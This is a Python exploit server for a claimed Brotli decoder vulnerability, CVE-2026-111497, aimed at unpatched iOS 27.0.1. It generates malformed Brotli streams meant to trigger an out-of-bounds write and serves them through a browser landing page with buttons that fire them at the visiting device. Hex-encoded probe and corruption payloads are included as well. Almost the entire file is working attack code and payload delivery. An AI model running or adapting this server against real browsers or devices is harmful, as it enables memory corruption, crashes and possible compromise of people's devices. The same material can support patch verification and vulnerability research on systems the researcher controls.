#!/usr/bin/env python3
"""CVE-2026-111497 Brotli Trigger Server v4 — Real Exploit Payloads.

This server uses the ACTUAL vulnerability mechanism: NBLTYPESL/I=2 with
block length exhaustion that triggers DecodeBlockTypeAndLength() on the
fast path where the return value is discarded (BROTLI_SAFE macro bug).

Two real trigger payloads:
  - syrex: ~512KB, NBLTYPESL=2, block type 0 length=1 -> type 1 length=0
           -> immediate double exhaustion -> OOB write
  - dimas: ~23MB, NBLTYPESI=2, initial command block length=0xFFFFFF
           -> 16M commands exhaust counter -> controlled block switch

Plus legacy detection probes and v2 corruption payloads for comparison.

Usage:
    python3 brotli_v4_server.py [port]
"""

import http.server
import sys
import time
import io

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8889


# ---------------------------------------------------------------------------
# Brotli bitstream writer (LSB-first per RFC 7932)
# ---------------------------------------------------------------------------

class Bits:
    def __init__(self):
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value, count):
        for i in range(count):
            self.value |= ((value >> i) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value):
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self):
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits, alphabet_size, symbol):
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits, value):
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


# ---------------------------------------------------------------------------
# REAL TRIGGER: syrex1013 approach (small, ~512KB)
# NBLTYPESL=2, block type 0 length=1, block type 1 length=0
# Double exhaustion forces DecodeBlockTypeAndLength on invalid state
# ---------------------------------------------------------------------------

def craft_syrex_trigger():
    w = Bits()
    w.put(0, 1)        # WBITS=16
    w.put(0, 1)        # ISLAST=0
    w.put(0b00, 2)     # MNIBBLES=0
    w.put(3, 4)        # MLEN-1=3 -> MLEN=4

    w.put(0, 1)        # ISUNCOMPRESSED=0

    # NBLTYPESL=2
    w.put(1, 1)        # more than 1 block type
    w.put(0b01, 2)     # simple prefix code
    w.put(0b01, 2)     # 2 symbols
    w.put(0, 1)        # symbol 0
    w.put(1, 1)        # symbol 1

    w.put(0, 1)        # NBLTYPESI=1
    w.put(0, 1)        # NBLTYPESD=1
    w.put(0, 2)        # NPOSTFIX=0
    w.put(0, 4)        # NDIRECT=0

    # Context modes for 2 literal block types
    w.put(0, 2)
    w.put(0, 2)

    # Block type 0 length code: symbol 0 = length 1 (exhausts after 1 literal)
    w.put(0b01, 2)
    w.put(0b00, 2)
    w.put(0, 6)

    # Block type 1 length code: symbol 63 = length 0 (immediate exhaustion)
    w.put(0b01, 2)
    w.put(0b00, 2)
    w.put(0b111111, 6)

    # Literal prefix codes (2 types, each 1-symbol for 'A')
    for _ in range(2):
        w.put(0b01, 2)
        w.put(0b00, 2)
        w.put(0x41, 8)

    # Insert-copy prefix code
    w.put(0b01, 2)
    w.put(0b00, 2)
    w.put(0, 6)

    # Distance prefix code
    w.put(0b01, 2)
    w.put(0b00, 2)
    w.put(0, 4)

    # Compressed data: IC symbol 0 + literal 'A'
    w.put(0, 1)
    w.put(0, 1)

    # Last empty metablock
    w.put(1, 1)        # ISLAST=1
    w.put(1, 1)        # ISLASTEMPTY=1

    payload = w.finish()

    # Pad to ~512KB for heap pressure
    target = 512 * 1024
    padding = max(0, target - len(payload))
    return payload + bytes([0xFF] * padding)


# ---------------------------------------------------------------------------
# REAL TRIGGER: dimasma0305 approach (large, ~23MB)
# NBLTYPESI=2, initial command block length=0xFFFFFF (16M commands)
# After exhaustion, decoder reads attacker-controlled block switch data
# ---------------------------------------------------------------------------

def craft_dimas_trigger():
    bits = Bits()

    # Window: WBITS=17
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    # Metablock: ISLAST=0, MNIBBLES=2, MLEN=0xFFFFFF
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)     # ISUNCOMPRESSED=0

    # NBLTYPESL=1
    varlen_u8(bits, 0)
    # NBLTYPESI=2 (KEY: two insert/copy block types)
    varlen_u8(bits, 1)
    one_symbol_tree(bits, 4, 0)       # block type tree
    one_symbol_tree(bits, 26, 25)     # block length tree (symbol 25 = max)
    bits.put(0xFFFFFF, 24)            # initial block length = 16,777,215
    # NBLTYPESD=1
    varlen_u8(bits, 0)
    bits.put(3, 6)     # NPOSTFIX + NDIRECT
    bits.put(0, 2)     # context mode
    # Context map
    varlen_u8(bits, 0)
    varlen_u8(bits, 0)

    # Huffman trees
    one_symbol_tree(bits, 256, 0)     # literal
    one_symbol_tree(bits, 704, 130)   # insert/copy type 0
    one_symbol_tree(bits, 704, 130)   # insert/copy type 1
    one_symbol_tree(bits, 400, 184)   # distance

    # 2^24 commands of 11-bit distance_extra to exhaust block counter
    distance_extra = 4
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)

    trigger = bits.finish()
    # Append 3 null bytes + stage-2 stub (127 bytes of 0xFF as crash trigger)
    return trigger + b"\x00" * 3 + b"\xFF" * 127


# ---------------------------------------------------------------------------
# Legacy payloads (detection probes + v2 corruption — kept for reference)
# ---------------------------------------------------------------------------

LEGACY_PAYLOADS = {
    "detect-base": bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000"),
    "detect-ext":  bytes.fromhex("200010414141fcffff07002228f00b60f7f41f00000000"),
    "oob-v2-0": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f3cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025595135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415234c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600"),
    "oob-v2-1": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f1cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025515135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415234c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600"),
    "oob-v2-2": bytes.fromhex("5b9f1683fee2c08e9581253aa47ae0a8816ddb9bacd661e3d60ec4e0bc90fb4e71705ec979c441a8708c90f74a64c881db89a92d89d8828db125746f2f1cad1508cdb94e78aff78e0e408409655c48a58d753ec4944b6d7dccb5cf7d1f00211841319c20299a61395e1025595135dd302ddb713d3f08a33849b3bc28abba69bb7e18a77959b7fd38affb79bfdf1f4030826238415634c372bc204ab2a26aba615ab6e37a7e104671926679515675d376fd304ef3b26efb715ef7f37e3f800813cab8904a1beb7c104671926679515675d376fd304ef3b26efb715ef7f37e3f8845cd23ab67ef4bd33a77e7100600"),
}


# ---------------------------------------------------------------------------
# Generate payloads at startup
# ---------------------------------------------------------------------------

print("Generating payloads...")
t0 = time.time()

SYREX_PAYLOAD = craft_syrex_trigger()
print(f"  syrex: {len(SYREX_PAYLOAD):,} bytes ({time.time()-t0:.1f}s)")

t1 = time.time()
print("  dimas: generating ~23MB stream (16M commands)... this takes ~30-60s")
DIMAS_PAYLOAD = craft_dimas_trigger()
print(f"  dimas: {len(DIMAS_PAYLOAD):,} bytes ({time.time()-t1:.1f}s)")

ALL_PAYLOADS = {
    "syrex": SYREX_PAYLOAD,
    "dimas": DIMAS_PAYLOAD,
}
ALL_PAYLOADS.update(LEGACY_PAYLOADS)

print(f"All payloads ready in {time.time()-t0:.1f}s")


# ---------------------------------------------------------------------------
# Landing page
# ---------------------------------------------------------------------------

LANDING = b"""\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Brotli v4 - Real Triggers</title>
<style>
*{box-sizing:border-box}
body{font-family:-apple-system,system-ui,sans-serif;padding:12px;background:#0a0a0a;color:#e0e0e0;margin:0}
h1{color:#f44;font-size:1.2em;margin:0 0 4px}
h2{color:#8af;font-size:0.95em;margin:14px 0 6px}
p{font-size:12px;color:#888;margin:2px 0}
.row{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
button{color:#fff;border:none;padding:12px 16px;border-radius:6px;font-size:14px;cursor:pointer;flex:1;min-width:120px}
button:active{opacity:0.7}
.red{background:#c33}
.orange{background:#a60}
.green{background:#363}
.blue{background:#36a}
.purple{background:#639}
.gray{background:#444}
.r{margin:4px 0;padding:6px 10px;border-radius:4px;font-family:monospace;font-size:12px}
.pending{background:#222;color:#666}
.vuln{background:#2a1a1a;color:#f88;border-left:3px solid #f44}
.safe{background:#1a2a1a;color:#8f8;border-left:3px solid #4f4}
.err{background:#2a2a1a;color:#ff8;border-left:3px solid #ff4}
.info{background:#1a1a2a;color:#8af;border-left:3px solid #48f}
#log{margin-top:8px;font-family:monospace;font-size:10px;white-space:pre-wrap;max-height:200px;overflow-y:auto;background:#111;padding:6px;border-radius:4px;color:#666}
.note{padding:8px;border-radius:4px;font-size:11px;margin:6px 0}
.warn{background:#2a1a0a;color:#fa0;border-left:3px solid #f80}
.explain{background:#1a1a1a;color:#999}
</style>
</head>
<body>
<h1>CVE-2026-111497 v4 - Real Triggers</h1>
<p>Actual exploit payloads using block length exhaustion (not MNIBBLES=0 probes)</p>

<div class="note warn">
<b>Real exploit triggers.</b> These use NBLTYPES=2 with block length exhaustion
to reach DecodeBlockTypeAndLength() on the fast path where the return value
is discarded. On unpatched decoders (iOS 27.0.1), this causes an OOB write.
</div>

<h2>Real Triggers</h2>
<div class="note explain">
<b>syrex</b> (~512KB): NBLTYPESL=2, block type 0 len=1 + type 1 len=0.
Double exhaustion forces stale Huffman state.<br>
<b>dimas</b> (~23MB): NBLTYPESI=2, 16M commands exhaust counter.
Attacker-controlled block switch data follows. <i>Large - may take time.</i>
</div>
<div class="row">
<button class="red" onclick="fire('syrex')">syrex (512KB)</button>
<button class="red" onclick="fireLarge('dimas')">dimas (23MB)</button>
</div>
<div class="row">
<button class="purple" onclick="fireDS('syrex')">DS: syrex</button>
<button class="purple" onclick="fireDS('dimas')">DS: dimas (slow)</button>
</div>

<h2>Detection Probes (22-23B, MNIBBLES=0)</h2>
<div class="note explain">
These test decoder error handling but do NOT reach the vulnerable code path.
They use MNIBBLES=0 (empty meta-block) which never triggers block-type switching.
</div>
<div class="row">
<button class="green" onclick="fire('detect-base')">detect-base</button>
<button class="green" onclick="fire('detect-ext')">detect-ext</button>
</div>

<h2>V2 Corruption (238B, bit-flipped streams)</h2>
<div class="note explain">
Bit-flipped valid streams. May produce wrong output but unlikely to trigger
the actual OOB write. Kept for comparison.
</div>
<div class="row">
<button class="gray" onclick="fire('oob-v2-0')">oob-v2-0</button>
<button class="gray" onclick="fire('oob-v2-1')">oob-v2-1</button>
<button class="gray" onclick="fire('oob-v2-2')">oob-v2-2</button>
</div>

<h2>Batch</h2>
<div class="row">
<button class="orange" onclick="fireAll()">Fire All Real</button>
<button class="blue" onclick="fireAllLegacy()">Fire All Legacy</button>
</div>

<div id="results"></div>
<div id="log"></div>

<script>
var R={},logEl=document.getElementById('log');
function log(m){logEl.textContent+=new Date().toISOString().slice(11,23)+' '+m+'\\n';logEl.scrollTop=logEl.scrollHeight}
function show(n,cls,txt){R[n]={cls:cls,txt:txt};var h='';for(var k in R)h+='<div class="r '+R[k].cls+'">'+k+': '+R[k].txt+'</div>';document.getElementById('results').innerHTML=h}

function fire(name){
  show(name,'pending','fetching...');
  log('>>> '+name+' via Content-Encoding: br');
  var t0=performance.now();
  fetch('/br/'+name).then(function(r){
    var ms=(performance.now()-t0).toFixed(0);
    var ce=r.headers.get('content-encoding');
    log('  HTTP '+r.status+' CE='+ce+' in '+ms+'ms');
    return r.arrayBuffer().then(function(buf){
      var a=new Uint8Array(buf);
      if(a.length===0){
        show(name,'err','Empty ('+ms+'ms) - decoder crash?');
        log('  EMPTY response - possible crash');
      } else if(a.length<50){
        var txt=new TextDecoder().decode(a);
        show(name,'info',txt.slice(0,80)+' ('+ms+'ms)');
        log('  Short: '+txt.slice(0,100));
      } else {
        show(name,'vuln',a.length+'B decoded ('+ms+'ms)');
        log('  Decoded '+a.length+'B');
      }
    });
  }).catch(function(e){
    var ms=(performance.now()-t0).toFixed(0);
    show(name,'err','Error ('+ms+'ms): '+e.message);
    log('  CATCH: '+e.message);
  });
}

function fireLarge(name){
  show(name,'pending','fetching large payload...');
  log('>>> '+name+' (LARGE) via Content-Encoding: br');
  var t0=performance.now();
  fetch('/br/'+name).then(function(r){
    var ms=(performance.now()-t0).toFixed(0);
    log('  HTTP '+r.status+' in '+ms+'ms, reading body...');
    return r.arrayBuffer().then(function(buf){
      var ms2=(performance.now()-t0).toFixed(0);
      var a=new Uint8Array(buf);
      if(a.length===0){
        show(name,'err','Empty ('+ms2+'ms) - CRASH');
        log('  EMPTY - decoder crashed on large payload');
      } else {
        show(name,'vuln',a.length+'B decoded ('+ms2+'ms)');
        log('  Decoded '+a.length+'B in '+ms2+'ms');
      }
    });
  }).catch(function(e){
    var ms=(performance.now()-t0).toFixed(0);
    show(name,'err','Error ('+ms+'ms): '+e.message);
    log('  CATCH: '+e.message);
  });
}

function fireDS(name){
  log('=== DecompressionStream: '+name+' ===');
  show('DS:'+name,'pending','testing...');
  if(typeof DecompressionStream==='undefined'){
    show('DS:'+name,'err','DecompressionStream not available');
    return;
  }
  fetch('/raw/'+name).then(function(r){return r.arrayBuffer()}).then(function(buf){
    log('  Raw bytes: '+buf.byteLength);
    var ds=new DecompressionStream('br');
    var w=ds.writable.getWriter();
    var rd=ds.readable.getReader();
    var chunks=[];
    w.write(new Uint8Array(buf));
    w.close();
    function pump(){
      return rd.read().then(function(r){
        if(r.done){
          var t=chunks.reduce(function(s,c){return s+c.length},0);
          show('DS:'+name,'vuln','DS decoded '+t+'B');
          log('  DS output: '+t+' bytes');
          return;
        }
        chunks.push(r.value);
        return pump();
      });
    }
    return pump();
  }).catch(function(e){
    show('DS:'+name,'err','DS: '+e.message);
    log('  DS error: '+e.message);
  });
}

function fireAll(){
  log('=== ALL REAL TRIGGERS ===');
  fire('syrex');
  setTimeout(function(){fireLarge('dimas')},1000);
}
function fireAllLegacy(){
  log('=== ALL LEGACY ===');
  var names=['detect-base','detect-ext','oob-v2-0','oob-v2-1','oob-v2-2'];
  names.forEach(function(n,i){setTimeout(function(){fire(n)},i*300)});
}
</script>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# HTTP handler
# ---------------------------------------------------------------------------

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(LANDING)))
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(LANDING)
            return

        if self.path.startswith('/br/'):
            name = self.path[4:].split('?')[0]
            if name in ALL_PAYLOADS:
                payload = ALL_PAYLOADS[name]
                ae = self.headers.get('Accept-Encoding', '')
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {self.client_address[0]} /br/{name} "
                      f"AE={ae} ({len(payload):,}B)")
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Encoding', 'br')
                if len(payload) > 1_000_000:
                    self.send_header('Transfer-Encoding', 'chunked')
                else:
                    self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                if len(payload) > 1_000_000:
                    chunk_size = 65536
                    for i in range(0, len(payload), chunk_size):
                        chunk = payload[i:i+chunk_size]
                        self.wfile.write(f"{len(chunk):x}\r\n".encode())
                        self.wfile.write(chunk)
                        self.wfile.write(b"\r\n")
                    self.wfile.write(b"0\r\n\r\n")
                else:
                    self.wfile.write(payload)
                return

        if self.path.startswith('/raw/'):
            name = self.path[5:].split('?')[0]
            if name in ALL_PAYLOADS:
                payload = ALL_PAYLOADS[name]
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {self.client_address[0]} /raw/{name} ({len(payload):,}B)")
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                if len(payload) > 1_000_000:
                    self.send_header('Transfer-Encoding', 'chunked')
                else:
                    self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                if len(payload) > 1_000_000:
                    chunk_size = 65536
                    for i in range(0, len(payload), chunk_size):
                        chunk = payload[i:i+chunk_size]
                        self.wfile.write(f"{len(chunk):x}\r\n".encode())
                        self.wfile.write(chunk)
                        self.wfile.write(b"\r\n")
                    self.wfile.write(b"0\r\n\r\n")
                else:
                    self.wfile.write(payload)
                return

        self.send_response(404)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'not found')

    def log_message(self, fmt, *args):
        pass


def main():
    server = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
    print(f"\nCVE-2026-111497 Brotli Trigger Server v4")
    print(f"  http://0.0.0.0:{PORT}/")
    print(f"  Real triggers: syrex ({len(SYREX_PAYLOAD):,}B), dimas ({len(DIMAS_PAYLOAD):,}B)")
    print(f"  Legacy: {[k for k in LEGACY_PAYLOADS]}")
    print(f"  /br/<name>  = Content-Encoding: br")
    print(f"  /raw/<name> = raw bytes (for DecompressionStream)")
    print()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == '__main__':
    main()
